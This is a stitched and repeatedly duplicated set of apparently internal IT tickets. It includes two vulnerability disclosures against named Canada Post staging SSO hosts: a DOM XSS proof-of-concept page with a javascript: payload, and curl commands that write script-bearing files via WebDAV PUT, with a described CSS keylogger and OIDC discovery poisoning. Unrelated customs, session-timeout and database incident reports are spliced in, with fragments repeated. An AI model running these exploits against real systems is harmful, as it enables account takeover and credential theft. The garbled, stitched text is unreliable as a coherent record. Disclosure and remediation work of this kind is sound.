A vulnerability has been discovered in the stg002-sso.epost.ca SSO logout endpoint where a DOM-based cross-site scripting (XSS) vulnerability allows attackers to execute arbitrary JavaScript in the context of the authentication gateway.

Affected Asset
The affected asset is the stg001-sso.epost.ca, stg002-sso.epost.ca, stg003-sso.epost.ca and stg004-sso.epost.ca SSO logout endpoints, specifically the /pkmslogout page with the vulnerable targetUrl parameter at:

https://stg002-sso.epost.ca/pkmslogout?targetUrl

Steps to Reproduce:

Host a malicious HTML page at any URL containing canadapost-postescanada.ca/ as a substring (e.g., using httpworkbench.com):

<html>
<head>
  <!-- Override browser Referrer-Policy to send full URL as Referer -->
  <meta name="referrer" content="unsafe-url">
</head>
<body>
  <script>
    // When victim is redirected from this page, the browser sends:
    // Referer: https://attacker.com/?x=canadapost-postescanada.ca/
    // → satisfies: ref.indexOf("canadapost-postescanada.ca/") > -1  ✓
    window.location.href =
      "https://stg002-sso.epost.ca/pkmslogout" +
      "?targetUrl=java%09script%3Aalert%28document.domain%2B%22%3Bcanadapost-postescanada.ca%2F%22%29";
  </script>
</body>
</html>


The payload in the targetUrl parameter decodes as follows:

java%09script%3Aalert%28document.domain%2B%22%3Bcanadapost-postescanada.ca%2F%22%29
URL decoded:

java    script:alert(document.domain+";canadapost-postescanada.ca/")
Send the malicious link to a victim:

https://<your-instance>.instances.httpworkbench.com/?x=canadapost-postescanada.ca/
When the victim clicks the link, they are automatically redirected to the payload URL and the XSS executes on stg002-sso.epost.ca.

Impact
This vulnerability allows arbitrary JavaScript execution in the stg002-sso.epost.ca origin. The vulnerability exploits weak substring-based domain validation and bypasses referrer header checks. Since this affects the authentication gateway, successful exploitation could lead to account takeovers through session hijacking or credential theft.

Please investigate whether there is / was active exploitation. Before closing this ticket, at minimum, identify the date and time I ran the PoC.

column48:
A vulnerability has been discovered in the stg002-sso.epost.ca SSO logout endpoint where a DOM-based cross-site scripting (XSS) vulnerability allows attackers to execute arbitrary JavaScript in the context of the authentication gateway.

Affected Asset
The affected asset is the stg001-sso.epost.ca, stg002-sso.epost.ca, stg003-sso.epost.ca and stg004-sso.epost.ca SSO logout endpoints, specifically the /pkmslogout page with the vulnerable targetUrl parameter at:

https://stg002-sso.epost.ca/pkmslogout?targetUrl

Steps to Reproduce:

Host a malicious HTML page at any URL containing canadapost-postescanada.ca/ as a substring (e.g., using httpworkbench.com):

<html>
<head>
  <!-- Override browser Referrer-Policy to send full URL as Referer -->
  <meta name="referrer" content="unsafe-url">
</head>
<body>
  <script>
    // When victim is redirected from this page, the browser sends:
    // Referer: https://attacker.com/?x=canadapost-postescanada.ca/
    // → satisfies: ref.indexOf("canadapost-postescanada.ca/") > -1  ✓
    window.location.href =
      "https://stg002-sso.epost.ca/pkmslogout" +
      "?targetUrl=java%09script%3Aalert%28document.domain%2B%22%3Bcanadapost-postescanada.ca%2F%22%29";
  </script>
</body>
</html>


The payload in the targetUrl parameter decodes as follows:

java%09script%3Aalert%28document.domain%2B%22%3Bcanadapost-postescanada.ca%2F%22%29
URL decoded:

java    script:alert(document.domain+";canadapost-postescanada.ca/")
Send the malicious link to a victim:

https://<your-instance>.instances.httpworkbench.com/?x=canadapost-postescanada.ca/
When the victim clicks the link, they are automatically redirected to the payload URL and the XSS executes on stg002-sso.epost.ca.

Impact
This vulnerability allows arbitrary JavaScript execution in the stg002-sso.epost.ca origin. The vulnerability exploits weak substring-based domain validation and bypasses referrer header checks. Since this affects the authentication gateway, successful exploitation could lead to account takeovers through session hijacking or credential theft.

Please investigate whether there is / was active exploitation. Before closing this ticket, at minimum, identify the date and time I ran the PoC.

1. Issue Summary and Business Impact
On **July 24**, new United States customs regulations came into effect requiring **postal shipments containing alcohol, tobacco, or goods subject to Antidumping and Countervailing Duty (AD/CVD) orders** to be entered under a **Type 1 formal entry** process. This process is outside the workflow currently supported by the **Canada Post - Zonos solution**.

To maintain regulatory compliance, Zonos deployed new logic on **July 24 at 2:05 PM MDT / 4:05 PM EDT** to prevent such shipments from being processed through Zonos applications. Shortly after deployment, some **Prepay app users reported that valid shipments were also being blocked**, resulting in unexpected shipment creation failures for certain U.S.-bound shipments.

***

2. Diagnostics Performed
* Reviewed customer reports received beginning at **2:44 PM MDT / 4:44 PM EDT** indicating that the newly deployed compliance logic was impacting shipments beyond the intended scope.
* Investigated the newly implemented shipment validation and restriction logic introduced to support the updated U.S. customs requirements.
* Verified the behavior against the affected shipment scenarios and identified the source of the incorrect blocking behavior.
* Assessed the impact to ensure only supported shipment categories were affected after remediation.

***

3. Root Cause (or Likely Cause)
A defect in the newly deployed compliance logic caused the shipment restrictions to be applied more broadly than intended. As a result, certain shipments that were not classified as alcohol, tobacco, or AD/CVD goods were incorrectly prevented from being processed through the Prepay application.

***

 4. Resolution
* Zonos quickly identified the issue following customer reports.
* A corrective fix was developed and deployed on the **same afternoon** as the initial release.
* The updated logic now correctly restricts only shipments containing:
  * Alcohol
  * Tobacco
  * Goods subject to AD/CVD orders
* These restricted commodities will continue to generate an error message, which is expected behavior because they cannot be processed through the current **Canada Post - Zonos solution**.
* The incident has been resolved, and customers can once again create eligible U.S.-bound shipments successfully.

***

 5. Validation / Testing Performed
* Confirmed that the corrective fix was successfully deployed.
* Validated that eligible U.S.-bound shipments can be created without issue through the Prepay application.
* Verified that shipments containing alcohol, tobacco, or AD/CVD-controlled goods continue to be blocked as designed to maintain compliance with the new U.S. customs regulations.
* Monitored post-deployment behavior and confirmed restoration of normal shipment processing for supported commodities.

To maintain regulatory compliance, Zonos deployed new logic on **July 24 at 2:05 PM MDT / 4:05 PM EDT** to prevent such shipments from being processed through Zonos applications. Shortly after deployment, some **Prepay app users reported that valid shipments were also being blocked**, resulting in unexpected shipment creation failures for certain U.S.-bound shipments.

***

2. Diagnostics Performed
* Reviewed customer reports received beginning at **2:44 PM MDT / 4:44 PM EDT** indicating that the newly deployed compliance logic was impacting shipments beyond the intended scope.

1. Issue Summary and Business Impact
On **July 24**, new United States customs regulations came into effect requiring **postal shipments containing alcohol, tobacco, or goods subject to Antidumping and Countervailing Duty (AD/CVD) orders** to be entered under a **Type 1 formal entry** process. This process is outside the workflow currently supported by the **Canada Post - Zonos solution**.

To maintain regulatory compliance, Zonos deployed new logic on **July 24 at 2:05 PM MDT / 4:05 PM EDT** to prevent such shipments from being processed through Zonos applications. Shortly after deployment, some **Prepay app users reported that valid shipments were also being blocked**, resulting in unexpected shipment creation failures for certain U.S.-bound shipments.

***

2. Diagnostics Performed
* Reviewed customer reports received beginning at **2:44 PM MDT / 4:44 PM EDT** indicating that the newly deployed compliance logic was impacting shipments beyond the intended scope.
* Investigated the newly implemented shipment validation and restriction logic introduced to support the updated U.S. customs requirements.
* Verified the behavior against the affected shipment scenarios and identified the source of the incorrect blocking behavior.
* Assessed the impact to ensure only supported shipment categories were affected after remediation.

***

3. Root Cause (or Likely Cause)
A defect in the newly deployed compliance logic caused the shipment restrictions to be applied more broadly than intended. As a result, certain shipments that were not classified as alcohol, tobacco, or AD/CVD goods were incorrectly prevented from being processed through the Prepay application.

***

 4. Resolution
* Zonos quickly identified the issue following customer reports.
* A corrective fix was developed and deployed on the **same afternoon** as the initial release.
* The updated logic now correctly restricts only shipments containing:
  * Alcohol
  * Tobacco
  * Goods subject to AD/CVD orders
* These restricted commodities will continue to generate an error message, which is expected behavior because they cannot be processed through the current **Canada Post - Zonos solution**.
* The incident has been resolved, and customers can once again create eligible U.S.-bound shipments successfully.

***

 5. Validation / Testing Performed
* Confirmed that the corrective fix was successfully deployed.
* Validated that eligible U.S.-bound shipments can be created without issue through the Prepay application.
* Verified that shipments containing alcohol, tobacco, or AD/CVD-controlled goods continue to be blocked as designed to maintain compliance with the new U.S. customs regulations.
* Monitored post-deployment behavior and confirmed restoration of normal shipment processing for supported commodities.

  * Alcohol

* The incident has been resolved, and customers can once again create eligible U.S.-bound shipments successfully.

1. Issue Summary and Business Impact
On **July 24**, new United States customs regulations came into effect requiring **postal shipments containing alcohol, tobacco, or goods subject to Antidumping and Countervailing Duty (AD/CVD) orders** to be entered under a **Type 1 formal entry** process. This process is outside the workflow currently supported by the **Canada Post - Zonos solution**.

To maintain regulatory compliance, Zonos deployed new logic on **July 24 at 2:05 PM MDT / 4:05 PM EDT** to prevent such shipments from being processed through Zonos applications. Shortly after deployment, some **Prepay app users reported that valid shipments were also being blocked**, resulting in unexpected shipment creation failures for certain U.S.-bound shipments.

***

2. Diagnostics Performed
* Reviewed customer reports received beginning at **2:44 PM MDT / 4:44 PM EDT** indicating that the newly deployed compliance logic was impacting shipments beyond the intended scope.
* Investigated the newly implemented shipment validation and restriction logic introduced to support the updated U.S. customs requirements.
* Verified the behavior against the affected shipment scenarios and identified the source of the incorrect blocking behavior.
* Assessed the impact to ensure only supported shipment categories were affected after remediation.

***

3. Root Cause (or Likely Cause)
A defect in the newly deployed compliance logic caused the shipment restrictions to be applied more broadly than intended. As a result, certain shipments that were not classified as alcohol, tobacco, or AD/CVD goods were incorrectly prevented from being processed through the Prepay application.

***

 4. Resolution
* Zonos quickly identified the issue following customer reports.
* A corrective fix was developed and deployed on the **same afternoon** as the initial release.
* The updated logic now correctly restricts only shipments containing:
  * Alcohol
  * Tobacco
  * Goods subject to AD/CVD orders
* These restricted commodities will continue to generate an error message, which is expected behavior because they cannot be processed through the current **Canada Post - Zonos solution**.
* The incident has been resolved, and customers can once again create eligible U.S.-bound shipments successfully.

***

 5. Validation / Testing Performed
* Confirmed that the corrective fix was successfully deployed.
* Validated that eligible U.S.-bound shipments can be created without issue through the Prepay application.
* Verified that shipments containing alcohol, tobacco, or AD/CVD-controlled goods continue to be blocked as designed to maintain compliance with the new U.S. customs regulations.
* Monitored post-deployment behavior and confirmed restoration of normal shipment processing for supported commodities.

column48:
CRA is receiving complaints regarding how Connect times out.

Users report that:

- sessions appear to expire while they are actively working on responses;
- draft messages are lost when a timeout occurs as the message is sent;
- users sometimes believe a message has been submitted, only to discover after logging back in that the session expired before the action was completed; and
- the repeated need to re-authenticate disrupts workflow and creates uncertainty about whether work has been successfully saved or transmitted.

Beyond the productivity impacts, these issues are affecting user and management confidence in the reliability and usability of the platform, particularly given the volume of correspondence now being handled through Connect.

@Support Team, what can we do to resolve this issue?

Can we extend the time out period for Connect?
Can  we implement a keep alive button to extend the time out?

As noted above, user's are being timed out without any notification which is not appropriate.
They are allowed to continue entering data and only discover the time out when the move screens.

A vulnerability has been discovered in the IBM Tivoli WebSEAL SSO deployment where an attacker can exploit WebDAV methods to write arbitrary files across the entire unmapped URL space, enabling credential theft, federation poisoning, and service disruption attacks.

Affected Asset:
The affected asset is the stg003-sso.epost.ca IBM Tivoli WebSEAL SSO origin, specifically accepting WebDAV PUT and DELETE methods on any unmapped path. The vulnerability also affects stg002-sso.epost.ca with the same primitive. Demonstrated vulnerable paths include /pdadmin/ws_include/*, /pkmsforgot.html, /pkmsmfa.html, /pkmswebauthn.html, /pkmsvouchfor, /.well-known/jwks.json, /.well-known/oauth-authorization-server, and 70+ additional paths across WebSEAL system handlers, OAuth/OIDC discovery endpoints, and static asset paths.

Steps to Reproduce:
Obtain an OAuth bearer token via the public registration and ROPC grant flow:

curl -ksS --http2 'https://stg003-sso.epost.ca/mga/sps/oauth/oauth20/token' \
  -d 'grant_type=password&client_id=cpc-nativeapp-2020&username=<username>&password=<password>&scope=openid'

Use the bearer token to PUT arbitrary HTML content to any unmapped path:

curl -ksS --http2 -X PUT \
  'https://stg003-sso.epost.ca/pfe2-pap2/jmrb-evidence-1778362000.html' \
  -H 'Authorization: Bearer <bearer>' \
  -H 'Content-Type: text/html' \
  --data-binary '<html><script>document.title="XSS-FIRED-"+document.domain;</script></html>'

Observe the server returns HTTP 201 Created with IBM Tivoli's "PUT operation successful" template, confirming server-side execution.

Verify the content is retrievable with the attacker-chosen Content-Type:

curl -ksS --http2 \
  'https://stg003-sso.epost.ca/pfe2-pap2/jmrb-evidence-1778362000.html' \
  -H 'Authorization: Bearer <bearer>'  -i

Confirm cross-user access by retrieving the same file using a different bearer token from another account.


Impact:
An attacker can write arbitrary HTML, JavaScript, or CSS files to the SSO origin and serve them to other users, enabling multiple attack vectors:

Credential theft: The CSS keylogger at /pdadmin/ws_include/extendstyles.css captures every keystroke in password fields across all EAS error/login/logout pages via CSS attribute selectors, requiring no JavaScript execution and bypassing CSP restrictions.

Session hijacking: Malicious JavaScript can be planted at system handler paths like /pkmsforgot.html, /pkmsmfa.html, and /pkmswebauthn.html to capture password recovery tokens, MFA enrollment seeds, and WebAuthn credential challenges.

Federation poisoning: Attackers can overwrite OAuth/OIDC discovery endpoints like /.well-known/jwks.json and /.well-known/oauth-authorization-server to redirect token flows and swap signing keys for any RFC-8414 compliant client.

Service disruption: DELETE operations can remove legitimate handlers like /pkmsvouchfor, breaking SSO functionality between Canada Post properties until administrative restoration.

The vulnerability affects 74+ demonstrated paths across the entire WebSEAL URL space, with cross-user storage confirmed and no per-user namespacing protection.


Task:
1. jmrb-evidence-1778362000.html, jmrb-evidence-17783620001.html and test.html are all files that have been created. Please delete these files and determine if any other files have been created. 
2. Audit the EAS landing template's <link> references to /pdadmin/ws_include/*; either remove the references or deploy the missing files so the path returns 403 instead of accepting attacker writes.
23 Disable WebDAV write methods (PUT, DELETE, MKCOL, COPY, MOVE, PROPPATCH, LOCK) at the WebSEAL configuration level for all junctions and the host-root URL space; return 405 Method Not Allowed unconditionally across all production-equivalent SSO hosts.
If any internal admin use case requires write methods, restrict via WebSEAL ACL to a named admin role with mTLS or admin-tier authentication, scoped to a narrow allow-listed path prefix rather than the entire URL space.

A vulnerability has been discovered in the IBM Tivoli WebSEAL SSO deployment where an attacker can exploit WebDAV methods to write arbitrary files across the entire unmapped URL space, enabling credential theft, federation poisoning, and service disruption attacks.

Affected Asset:
The affected asset is the stg003-sso.epost.ca IBM Tivoli WebSEAL SSO origin, specifically accepting WebDAV PUT and DELETE methods on any unmapped path. The vulnerability also affects stg002-sso.epost.ca with the same primitive. Demonstrated vulnerable paths include /pdadmin/ws_include/*, /pkmsforgot.html, /pkmsmfa.html, /pkmswebauthn.html, /pkmsvouchfor, /.well-known/jwks.json, /.well-known/oauth-authorization-server, and 70+ additional paths across WebSEAL system handlers, OAuth/OIDC discovery endpoints, and static asset paths.

Steps to Reproduce:
Obtain an OAuth bearer token via the public registration and ROPC grant flow:

curl -ksS --http2 'https://stg003-sso.epost.ca/mga/sps/oauth/oauth20/token' \
  -d 'grant_type=password&client_id=cpc-nativeapp-2020&username=<username>&password=<password>&scope=openid'

Use the bearer token to PUT arbitrary HTML content to any unmapped path:

curl -ksS --http2 -X PUT \
  'https://stg003-sso.epost.ca/pfe2-pap2/jmrb-evidence-1778362000.html' \
  -H 'Authorization: Bearer <bearer>' \
  -H 'Content-Type: text/html' \
  --data-binary '<html><script>document.title="XSS-FIRED-"+document.domain;</script></html>'

Observe the server returns HTTP 201 Created with IBM Tivoli's "PUT operation successful" template, confirming server-side execution.

Verify the content is retrievable with the attacker-chosen Content-Type:

curl -ksS --http2 \
  'https://stg003-sso.epost.ca/pfe2-pap2/jmrb-evidence-1778362000.html' \
  -H 'Authorization: Bearer <bearer>'  -i

Confirm cross-user access by retrieving the same file using a different bearer token from another account.


Impact:
An attacker can write arbitrary HTML, JavaScript, or CSS files to the SSO origin and serve them to other users, enabling multiple attack vectors:

Credential theft: The CSS keylogger at /pdadmin/ws_include/extendstyles.css captures every keystroke in password fields across all EAS error/login/logout pages via CSS attribute selectors, requiring no JavaScript execution and bypassing CSP restrictions.

Session hijacking: Malicious JavaScript can be planted at system handler paths like /pkmsforgot.html, /pkmsmfa.html, and /pkmswebauthn.html to capture password recovery tokens, MFA enrollment seeds, and WebAuthn credential challenges.

Federation poisoning: Attackers can overwrite OAuth/OIDC discovery endpoints like /.well-known/jwks.json and /.well-known/oauth-authorization-server to redirect token flows and swap signing keys for any RFC-8414 compliant client.

Service disruption: DELETE operations can remove legitimate handlers like /pkmsvouchfor, breaking SSO functionality between Canada Post properties until administrative restoration.

The vulnerability affects 74+ demonstrated paths across the entire WebSEAL URL space, with cross-user storage confirmed and no per-user namespacing protection.


Task:
1. jmrb-evidence-1778362000.html, jmrb-evidence-17783620001.html and test.html are all files that have been created. Please delete these files and determine if any other files have been created. 
2. Audit the EAS landing template's <link> references to /pdadmin/ws_include/*; either remove the references or deploy the missing files so the path returns 403 instead of accepting attacker writes.
23 Disable WebDAV write methods (PUT, DELETE, MKCOL, COPY, MOVE, PROPPATCH, LOCK) at the WebSEAL configuration level for all junctions and the host-root URL space; return 405 Method Not Allowed unconditionally across all production-equivalent SSO hosts.
If any internal admin use case requires write methods, restrict via WebSEAL ACL to a named admin role with mTLS or admin-tier authentication, scoped to a narrow allow-listed path prefix rather than the entire URL space.

based on your last input timings we have Done AWR analysis which does not indicate any database CPU, memory, or storage bottleneck. However, The workload is heavily concentrated on SSO_OWNER.PROOFING_PROFILE, which accounts for the vast majority of logical reads.
The reported SELECT statements are CPU-intensive and appear to be repeatedly accessing PROOFING_PROFILE_PK.
The UPDATE statement and MOVE_DELETED_PROOFING_RECORDS procedure are likely experiencing row-level locking while accessing the same data set by same operations or different query. AWR captured enq: TX - row lock contention waits and row-lock activity on PROOFING_PROFILE Table.
MOVE_DELETED_PROOFING_RECORDS The procedure accesses the same objects (PROOFING_PROFILE, deletion tables) and is likely competing with UPDATE sessions. This can cause lock waits and block transfers in RAC.
We recommend reviewing these executions and indexing for the SELECT statements, and investigating blocking sessions/transaction duration for the UPDATE and procedure executions occurring around 17:36 IST.
So if these select, Procedure and Update are running as part of same operations and are running concurrently on these objects may have lead to possible delays in executions. We think this needs object level optimization which can help such slowness unless there was any sudden Huge data level spike which could have lead this delays due to more data.\

Issue Description : AppDynamics generated a critical health rule violation for application cco-identitybackend-ibe-jsb-svc-prd under alert CPU-ErrorPercent-AvgResponseTime. The alert was triggered due to an increase in average response time above the configured AppDynamics baseline. Investigation showed slow-running database operations involving SSO_OWNER.PROOFING_PROFILE, including SELECT queries, UPDATE statements, and the procedure MOVE_DELETED_PROOFING_RECORDS. The alert later ended/cleared in AppDynamics.

Impact to Business : No customer complaints were received during the incident window. The application was running fine from a functional/service availability perspective, and no complete application outage was observed. No data loss was reported. The impact was limited to AppDynamics-detected performance degradation due to elevated response time for database-dependent transactions.

Root Cause / Likely Cause : DBA analysis confirmed there was no database CPU, memory, storage, or infrastructure bottleneck. The likely cause was inefficient database access on SSO_OWNER.PROOFING_PROFILE. Application queries primarily filter on CPC_ID, but the existing primary key index is defined as PROOFING_PROFILE_PK (DSS_ID, CPC_ID). Since CPC_ID is not the leading column, Oracle used an inefficient INDEX SKIP SCAN, causing excessive logical reads and slower query response times. AWR analysis showed approximately 1.38 billion logical reads, accounting for nearly 94% of total logical reads. Additionally, row-lock contention was observed on PROOFING_PROFILE, likely due to overlap between application UPDATE operations and the MOVE_DELETED_PROOFING_RECORDS procedure, which performs DML operations on the same table.

Resolution Action Taken : DBA performed AWR analysis, reviewed SQL execution statistics, analyzed execution plans, verified index usage, reviewed locking waits, and assessed table/index statistics. DBA confirmed that affected queries are using INDEX SKIP SCAN on the existing primary key and recommended evaluating a dedicated index on SSO_OWNER.PROOFING_PROFILE with CPC_ID as the leading column. No immediate production database change was implemented. The AppDynamics alert ended/cleared, and application service remained operational. Further action will be handed over to Development/Non-Production teams for evaluation and testing of the proposed indexing strategy before any production implementation.

Validation Steps Performed / QA : DBA validated the issue through AWR reports, SQL statistics, execution plan review, index access path analysis, locking wait review, and table statistics assessment. It was confirmed that the slow queries were using INDEX SKIP SCAN and that row-lock contention was present during the incident window. From the application side, no customer complaints or functional outage were observed, and the AppDynamics alert eventually ended. Further QA validation is required to confirm whether the proposed CPC_ID-leading index improves query performance and does not negatively impact INSERT/UPDATE/DELETE operations.

Preventive Measures : Evaluate and implement a dedicated CPC_ID-leading index on SSO_OWNER.PROOFING_PROFILE after proper validation. Review application query patterns to ensure indexes align with commonly used predicates. Review concurrency between application UPDATE operations and MOVE_DELETED_PROOFING_RECORDS to reduce row-lock contention. Consider scheduling, batching, or redesigning the procedure if it overlaps with user-facing application activity. Enhance monitoring for database response time, slow SQL count, row-lock waits, and AppDynamics backend latency.

Issue Description : AppDynamics generated a critical health rule violation for application cco-identitybackend-ibe-jsb-svc-prd under alert CPU-ErrorPercent-AvgResponseTime. The alert was triggered due to an increase in average response time above the configured AppDynamics baseline. Investigation showed slow-running database operations involving SSO_OWNER.PROOFING_PROFILE, including SELECT queries, UPDATE statements, and the procedure MOVE_DELETED_PROOFING_RECORDS. The alert later ended/cleared in AppDynamics.

Impact to Business : No customer complaints were received during the incident window. The application was running fine from a functional/service availability perspective, and no complete application outage was observed. No data loss was reported. The impact was limited to AppDynamics-detected performance degradation due to elevated response time for database-dependent transactions.

Root Cause / Likely Cause : DBA analysis confirmed there was no database CPU, memory, storage, or infrastructure bottleneck. The likely cause was inefficient database access on SSO_OWNER.PROOFING_PROFILE. Application queries primarily filter on CPC_ID, but the existing primary key index is defined as PROOFING_PROFILE_PK (DSS_ID, CPC_ID). Since CPC_ID is not the leading column, Oracle used an inefficient INDEX SKIP SCAN, causing excessive logical reads and slower query response times. AWR analysis showed approximately 1.38 billion logical reads, accounting for nearly 94% of total logical reads. Additionally, row-lock contention was observed on PROOFING_PROFILE, likely due to overlap between application UPDATE operations and the MOVE_DELETED_PROOFING_RECORDS procedure, which performs DML operations on the same table.

Resolution Action Taken : DBA performed AWR analysis, reviewed SQL execution statistics, analyzed execution plans, verified index usage, reviewed locking waits, and assessed table/index statistics. DBA confirmed that affected queries are using INDEX SKIP SCAN on the existing primary key and recommended evaluating a dedicated index on SSO_OWNER.PROOFING_PROFILE with CPC_ID as the leading column. No immediate production database change was implemented. The AppDynamics alert ended/cleared, and application service remained operational. Further action will be handed over to Development/Non-Production teams for evaluation and testing of the proposed indexing strategy before any production implementation.

Validation Steps Performed / QA : DBA validated the issue through AWR reports, SQL statistics, execution plan review, index access path analysis, locking wait review, and table statistics assessment. It was confirmed that the slow queries were using INDEX SKIP SCAN and that row-lock contention was present during the incident window. From the application side, no customer complaints or functional outage were observed, and the AppDynamics alert eventually ended. Further QA validation is required to confirm whether the proposed CPC_ID-leading index improves query performance and does not negatively impact INSERT/UPDATE/DELETE operations.

Preventive Measures : Evaluate and implement a dedicated CPC_ID-leading index on SSO_OWNER.PROOFING_PROFILE after proper validation. Review application query patterns to ensure indexes align with commonly used predicates. Review concurrency between application UPDATE operations and MOVE_DELETED_PROOFING_RECORDS to reduce row-lock contention. Consider scheduling, batching, or redesigning the procedure if it overlaps with user-facing application activity. Enhance monitoring for database response time, slow SQL count, row-lock waits, and AppDynamics backend latency.
